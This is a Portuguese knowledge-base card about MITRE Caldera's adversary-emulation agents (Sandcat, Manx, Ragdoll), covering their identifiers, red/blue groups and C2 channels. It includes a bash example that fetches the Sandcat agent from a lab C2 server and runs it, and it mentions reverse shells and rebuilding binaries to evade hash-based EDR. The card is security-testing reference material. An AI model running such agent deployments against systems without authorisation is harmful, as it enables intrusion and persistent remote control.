---
id: software.seguranca.tranche12.001122
tipo: tecnica
dominio: software
subdominio: seguranca
nivel: intermediario
confianca: media
ultima_verificacao: 2026-10-03
validade: volatil
status: candidata
revisao_humana: nao_solicitada
revisor: ""
revisao_ia: aprovada
revisor_ia: "Arena.ai Agent Mode"
data_revisao_ia: 2026-10-03
relatorio_revisao_ia: "knowledge-federation/exports/reports/ai-review-software-seguranca-2000-0003-tranche-12.md"
fontes: ["https://raw.githubusercontent.com/mitre/caldera/master/README.md", "https://caldera.readthedocs.io/en/latest/Learning-the-terminology.html"]
tags: [dominio/software, subdominio/seguranca, qualidade/candidata]
lote: software-seguranca-2000-0003
---

# Agentes do Caldera (**`Sandcat`**, **`Manx`** e **`Ragdoll`**): Identificadores **`paw`**, Canais de Contato C2 (**HTTP, TCP, DNS, Gist**) e Grupos Red/Blue

## Em uma frase
Para executar técnicas nos sistemas de destino durante uma operação, o Caldera utiliza **Agentes (*Agents*)** — programas leves que fazem *beacon* periódico de volta ao servidor Caldera (com *sleep min/max* e *jitter* configuráveis) para buscar instruções!

## Por que importa
Cada agente instalado recebe um identificador único chamado **`paw` (*paw print*)**, é associado a um **`group`** (agentes no grupo `blue` ficam visíveis no dashboard de resposta a incidentes do Blue Team, enquanto os demais grupos compõem os alvos do Red Team) e comunica-se com o servidor através de um método de **`contact`**!

## Como funciona
O Caldera inclui três agentes principais: **(1) `Sandcat` (`54ndc47`)** — o agente padrão escrito em **Go (GoLang)**, compilável dinamicamente para Windows, Linux e macOS e capaz de falar múltiplos protocolos C2 (**HTTP/HTTPS, DNS Tunneling, GitHub Gist, SMB, TCP**); **(2) `Manx`** — agente em Go que opera sobre contato TCP oferecendo *reverse-shell* interativo; e **(3) `Ragdoll`** — agente em Python que se comunica embutido em páginas HTML!

## Exemplo
```bash
# Iniciar um agente Sandcat em Linux conectando via contato HTTP ao servidor Caldera de laboratorio sob o grupo 'homolog-linux'
server="http://10.10.20.5:8888"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "${server}/file/download" > /tmp/sandcat-agent
chmod +x /tmp/sandcat-agent
/tmp/sandcat-agent -server "${server}" -group homolog-linux -v
```

## Limites e trade-offs
Quando o plugin **`builder`** está habilitado e o **Go 1.24+** está instalado no servidor Caldera, o servidor consegue **recompilar dinamicamente o binário do `Sandcat` a cada download** com parâmetros e hashes diferentes para testar se o seu EDR depende apenas de hashes estáticos de binários conhecidos!

## Como verificar
Ao encerrar uma operação de Purple Team, configure o **`watchdog`** ou envie o comando de *kill* para que os agentes Sandcat se autoencerrem limpa e automaticamente nos endpoints.

## Conexões
- [[caldera-arquitetura-plataforma-emulacao-adversarios-c2-plugins]] — Veja também: Arquitetura do **MITRE Caldera (`mitre/caldera`)**: Plataforma Automatizada de Emulação de Adversários, C2 Assíncrono e Ecossistema de Plugins.
- [[caldera-abilities-adversary-profiles-planners-facts-parsers]] — Veja também: Motor de Decisão Autônoma do Caldera: **Abilities**, **Adversary Profiles**, **Planners (`atomic`, `batch`, `buckets`)**, **Facts** e **Parsers**.
- [[caldera-furtividade-ofuscadores-jitter-builder-evasao-edr]] — Referência cruzada direta com caldera-furtividade-ofuscadores-jitter-builder-evasao-edr.

## Fontes
- [MITRE Caldera Official GitHub — Automated Adversary Emulation, Red Team & Incident Response Platform](https://raw.githubusercontent.com/mitre/caldera/master/README.md) — repositório oficial do MITRE Caldera v5 cobrindo o Core C2 Server, interface VueJS Magma e ecossistema de plugins (`sandcat`, `stockpile`, `atomic`, `emu`, `debrief`, `response`); consultado em 2026-10-03.
- [MITRE Caldera Official Documentation — Learning the Terminology (`Agents`, `Abilities`, `Adversaries`, `Operations`, `Planners`, `Facts`, `Parsers`)](https://caldera.readthedocs.io/en/latest/Learning-the-terminology.html) — documentação oficial ReadTheDocs detalhando a arquitetura de planejamento orientado a fatos e agentes do Caldera; consultado em 2026-10-03.
